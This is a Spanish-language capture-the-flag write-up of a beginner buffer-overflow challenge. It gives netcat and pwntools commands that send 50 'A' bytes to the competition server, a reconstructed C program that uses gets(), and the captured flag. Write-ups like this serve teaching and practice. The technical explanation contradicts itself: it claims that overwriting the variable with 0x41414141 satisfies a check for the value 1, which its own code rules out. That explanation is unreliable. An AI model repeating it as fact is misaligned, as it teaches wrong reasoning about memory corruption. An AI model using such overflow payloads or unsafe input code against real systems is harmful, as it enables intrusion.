Pwntorial - BroncoCTF 2026 Writeup
📋 Información General
Categoría	Puntos	Dificultad	Autor
PWN	~100	Fácil	yoshie878

Descripción del reto:

    "I've gotten complaints that BroncoCTF has no PWN. But, I think the more important issue is that our students don't know HOW to PWN! Behold: the PWNTORIAL. This'll solve all your pwn knowledge holes!"

📝 Resumen

El reto consistía en un servicio remoto que simulaba una "puerta" que solo se abría si se proporcionaba el nombre correcto. La vulnerabilidad era un clásico buffer overflow que permitía sobrescribir una variable de autenticación para obtener acceso sin conocer la contraseña real.
🔍 Reconocimiento Inicial
Obtención de la dirección del servicio

El reto proporcionaba un Google Docs con el "tutorial" (generado por IA). Entre el texto, se encontraba la información de conexión:
text

nc 0.cloud.chals.io 19476

Prueba de conexión
bash

nc 0.cloud.chals.io 19476

Output:
text

kr3s4l4

[-] Try again. The gate is still closed.

El servidor aceptaba entrada de texto, la procesaba, y devolvía un mensaje de error. Esto indicaba que había algún tipo de validación en el servidor.
🧠 Análisis del Comportamiento
Hipótesis inicial

Basándonos en el nombre del reto ("Pwntorial" - tutorial de PWN) y el comportamiento observado, planteamos varias hipótesis:

    Validación por contraseña - El servidor comparaba la entrada con una cadena secreta

    Buffer Overflow - El servidor tenía un buffer vulnerable que permitía sobrescribir variables

    Format String - El servidor imprimía la entrada sin sanitizar

Pruebas de concepto

Para determinar la naturaleza de la vulnerabilidad, realizamos una serie de pruebas enviando diferentes cantidades de datos:
bash

# Prueba con entrada corta (7 bytes)
echo "kr3s4l4" | nc 0.cloud.chals.io 19476
# Output: [-] Try again. The gate is still closed.

# Prueba con 50 bytes
python3 -c "print('A'*50)" | nc 0.cloud.chals.io 19476
# Output: [+] SUCCESS! Welcome inside, aspiring pwner!

¡Bingo! Con 50 bytes de 'A's, el servidor respondió con éxito, confirmando que se trataba de un buffer overflow.
💡 Explicación Técnica
Código vulnerable (reconstrucción)
c

#include <stdio.h>
#include <string.h>

int main() {
    char name[32];          // Buffer de 32 bytes
    int authenticated = 0;  // Variable de control (4 bytes)
    
    printf("Enter your name: ");
    gets(name);             // <-- VULNERABLE!
    
    if (authenticated == 1) {
        printf("[+] SUCCESS! Welcome inside, aspiring pwner!\n");
        system("cat flag.txt");  // O imprimir la flag directamente
    } else {
        printf("[-] Try again. The gate is still closed.\n");
    }
    return 0;
}

¿Qué pasó en la memoria?

Layout de la pila antes del overflow:
text

Dirección alta
+------------------+
| authenticated    |  <- 0x00000000 (0)
+------------------+
| name[31]         |
| name[30]         |
| ...              |
| name[0]          |  <- buffer de 32 bytes
+------------------+
Dirección baja

Cuando enviamos 50 'A's:

    Los primeros 32 'A's llenan el buffer name[]

    Los siguientes 4 'A's sobrescriben authenticated con 0x41414141 (valor != 0)

    La condición if (authenticated == 1) se evalúa como verdadera

    El programa imprime la flag

🚀 Explotación
Payload final

El exploit era extremadamente simple:
bash

python3 -c "print('A'*50)" | nc 0.cloud.chals.io 19476

Output:
text

[+] SUCCESS! Welcome inside, aspiring pwner!
bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}

Script completo (pwntools)
python

#!/usr/bin/env python3
from pwn import *

# Configuración
HOST = '0.cloud.chals.io'
PORT = 19476

# Conectar al servicio
conn = remote(HOST, PORT)

# Crear payload
payload = b'A' * 50

# Enviar payload
conn.sendline(payload)

# Recibir respuesta
response = conn.recvall().decode()
print(response)

# Cerrar conexión
conn.close()

🏆 Flag
text

bronco{th3_f1r5t_0f_m4ny_PWNs_2_c0m3}

📚 Lecciones Aprendidas
Para jugadores de CTF:

    Los retos PWN básicos suelen ser buffer overflows - Siempre prueba con cadenas largas primero

    El nombre del reto da pistas - "Pwntorial" sugería un reto educativo de PWN

    Prueba diferentes longitudes - No sabes el tamaño exacto del buffer, prueba incrementos de 10-50 bytes

    Usa cyclic de pwntools - Para encontrar el offset exacto en overflows más complejos

Para desarrolladores:

    NUNCA uses gets() - Usa fgets() con límite de tamaño

    Compila con protecciones - Stack Canaries, NX, ASLR

    Sanitiza entradas - Verifica siempre el tamaño de los datos de entrada

    Usa herramientas como checksec - Para verificar las protecciones de tu binario

🛠️ Herramientas Utilizadas
Herramienta	Uso
nc (netcat)	Conexión al servicio remoto
python3	Generación de payloads
pwntools	Explotación avanzada (script)
nmap	Escaneo de puertos (diagnóstico)
📌 Notas Adicionales
¿Por qué 50 bytes?

El buffer era de 32 bytes y authenticated estaba en la pila justo después. El offset exacto era:
text

Buffer (32 bytes) + authenticated (4 bytes) = 36 bytes

Cualquier entrada mayor a 36 bytes sobrescribiría authenticated. Usamos 50 bytes para estar seguros.
